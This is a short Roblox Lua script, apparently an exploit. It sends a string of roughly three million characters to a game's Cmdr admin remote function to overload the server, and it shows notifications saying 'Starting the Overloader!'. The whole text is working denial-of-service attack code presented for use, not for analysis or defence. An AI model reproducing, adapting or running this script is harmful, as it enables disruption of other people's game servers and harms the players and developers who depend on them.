local RepeatString = 960000
local OVERLOADSYSTEM = string.rep("run", RepeatString).." "

game.StarterGui:SetCore("SendNotification", {
	Title = "Cmdr exists."; 
	Text = "Starting the Overloader!";
})

if game:GetService("ReplicatedStorage").CmdrClient.CmdrFunction then
    game.StarterGui:SetCore("SendNotification", {
	    Title = "Cmdr exists."; 
	    Text = "Starting the Overloader!";
    })
    game:GetService("ReplicatedStorage").CmdrClient.CmdrFunction:InvokeServer(OVERLOADSYSTEM)
else
    game.StarterGui:SetCore("SendNotification", {
	    Title = "Cmdr does not exist."; 
	    Text = "Failed to overload!";
    })
end
